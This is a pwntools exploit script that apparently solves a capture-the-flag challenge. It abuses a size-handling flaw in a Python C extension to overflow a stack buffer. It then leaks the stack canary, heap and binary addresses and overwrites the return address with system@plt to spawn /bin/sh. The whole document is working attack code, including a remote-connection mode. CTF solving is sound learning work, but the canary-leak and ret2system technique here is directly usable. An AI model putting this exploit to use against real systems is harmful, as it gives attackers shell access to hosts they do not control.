#!/usr/bin/env python3

from pwn import *
from ctypes import c_ubyte

pybin = "./python3.10"

exe = ELF(pybin)

pyargs = ["./main.py"]

HOST, PORT = "pwn.chal.ctf.gdgalgiers.com", 1403

context.binary = exe
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

# Constants

GDBSCRIPT = '''\
'''
CHECKING = True

BUF_SIZE = 0x50
CANARY_OFF = BUF_SIZE + 0x8
RETADDR_OFF = BUF_SIZE + 0x48
BINLEAK_OFF = 0x1176b8
SYSTEM_PLT = 0x636

# Stack layout after buf[0x50] inf first call to cext_input
# 0: 0x7ffff7b9bbf0 (anon) +0x301bf0
# 1: 0xe787235b3e4eb200 (canary)
# 2: 0x7ffff7b71150 (anon) +0x2d7150
# 3: 0x7ffff78b0860 (anon) +0x16860
# 4: 0x555555b4e270 (heap) +0x64270
# 5: 0x555555b4e270 (heap) +0x64270
# 6: 0x7ffff78b0860 (anon) +0x16860
# 7: 0x0
# 8: 0x0
# 9: 0x5555556d86b8 (retaddr) +0x1176b8

FIRST_ANON0_OFF = 0x301bf0

# Stack layout after buf[0x50] in before last call to cext_input
# 0: 0x7f7f4a347bf0 (anon) +0x323bf0
# 1: 0x898c095d99891f00 (canary)
# 2: 0x0
# 3: 0x7f7f4a03c900 (anon) +0x18900
# 4: 0x55f0596da270 (heap) +0x1e270
# 5: 0x55f0596da270 (heap) +0x1e270
# 6: 0x7f7f4a03c900 (anon) +0x18900
# 7: 0x0
# 8: 0x0
# 9: 0x55f0583af6b8 (retaddr)

# Note: the offsets of anon addresses actually change on every run, so as long as the addresses are still in an area of those memory mappings, the exploit works

ANON0_OFF = 0x323bf0
ANON3_OFF = 0x18900
HEAP4_OFF = 0x1e270
HEAP5_OFF = 0x1e270
ANON6_OFF = 0x18900

def main():
    global io
    io = conn()

    # Leak first address after buf (anon0)

    size = BUF_SIZE
    csize = craftsize(size)
    sendsize(csize)

    payload = flat(
        b"A" * BUF_SIZE,
    )
    buf = sendbytes(payload, done=True)
    leakbuf = buf[BUF_SIZE:]
    anon = leak(leakbuf, FIRST_ANON0_OFF, "anon", verbose=True)

    # Leak canary

    io.recvuntil(b"Choice: ")
    io.sendline(b"1") # 1. Input

    size = CANARY_OFF + 1 # +1 for NULL LSB
    csize = craftsize(size)
    sendsize(csize)

    lsb = 0x1
    payload = flat(
        b"A" * BUF_SIZE,
        b"B" * (CANARY_OFF - BUF_SIZE),
        bytes([lsb]), # canary LSB
    )
    buf = sendbytes(payload, done=False)
    leakbuf = buf[CANARY_OFF:]
    canary = leak(leakbuf, lsb, "canary")

    payload = flat(
        b"A" * BUF_SIZE,
        b"B" * (CANARY_OFF - BUF_SIZE),
        bytes([0x0]), # canary LSB
    )
    sendbytes(payload, done=True)

    # Leak heap address

    io.recvuntil(b"Choice: ")
    io.sendline(b"1") # 1. Input

    size = BUF_SIZE + 0x8 * 4
    csize = craftsize(size)
    sendsize(csize)

    payload = flat(
        b"A" * BUF_SIZE,
        b"B" * 0x8 * 4,
    )
    buf = sendbytes(payload, done=False)
    leakbuf = buf[size:]
    heap_base = leak(leakbuf, HEAP4_OFF, "heap")

    payload = flat(
        b"A" * BUF_SIZE,
        anon + ANON0_OFF,
        canary,
        0x0,
        anon + ANON3_OFF,
    )
    sendbytes(payload, done=True)

    # Leak python return address

    io.recvuntil(b"Choice: ")
    io.sendline(b"1") # 1. Input

    size = RETADDR_OFF
    csize = craftsize(size)
    sendsize(csize)

    payload = flat(
        b"A" * BUF_SIZE,
        b"B" * (CANARY_OFF - BUF_SIZE),
        b"C" * 8, # canary
        b"D" * (RETADDR_OFF - CANARY_OFF - 8),
    )
    buf = sendbytes(payload, done=False)
    leakbuf = buf[RETADDR_OFF:]
    exe.address = leak(leakbuf, BINLEAK_OFF, "binary")

    payload = flat(
        b"A" * BUF_SIZE,
        anon + ANON0_OFF,
        canary,
        0x0,
        anon + ANON3_OFF,
        heap_base + HEAP4_OFF,
        heap_base + HEAP5_OFF,
        anon + ANON6_OFF,
        0x0,
        0x0,
    )
    sendbytes(payload, done=True)

    # ROP:
    # We actually only need to overwrite the return address with system@plt (from python3.10), and
    # that's because RDI will point to a buffer that contains the string we input.
    # That means if we put "/bin/sh\0" in the start of the payload, we can trigger system("/bin/sh")

    io.recvuntil(b"Choice: ")
    io.sendline(b"1") # 1. Input

    size = RETADDR_OFF + 8
    csize = craftsize(size)
    sendsize(csize)

    payload = flat(
        b"/bin/sh\0",
        b"A" * (BUF_SIZE - 0x8),
        anon + ANON0_OFF,
        canary,
        0x0,
        anon + ANON3_OFF,
        heap_base + HEAP4_OFF,
        heap_base + HEAP5_OFF,
        anon + ANON6_OFF,
        0x0,
        0x0,
        exe.address + SYSTEM_PLT,
    )
    sendbytes(payload, done=True)

    io.interactive()

def craftsize(size):
    return -c_ubyte(-(0x100 | size)).value

def sendsize(size):
    io.recvuntil(b"Enter size: ")
    io.sendline(f"{size}".encode())

def sendbytes(b, done=False):
    io.recvuntil(b"Enter bytes: ")
    io.send(b)
    io.recvuntil(b"Entered bytes: ")
    rb = io.recvuntil(b"\nDone? [y/n] ", drop=True)
    answer = b"y" if done else b"n"
    io.sendline(answer)
    return rb

def leak(buf, offset, leaktype, verbose=False, notlib=False):
    verbose and log.info(f"buf: {buf}")
    leak_addr = unpack(buf.ljust(context.bytes, b"\x00"))
    base_addr = leak_addr - offset
    verbose and log.info(f"{leaktype} leak: {leak_addr:#x}")
    log.success(f"{leaktype} base address: {base_addr:#x}")
    return base_addr

def stop():
    io.interactive()
    io.close()
    exit(1)

def check(predicate, disabled=False):
    if not disabled and CHECKING:
        assert(predicate)

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.GDB:
        p = gdb.debug([ exe.path ] + pyargs, gdbscript=GDBSCRIPT)
    else:
        p = process([ exe.path ] + pyargs)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
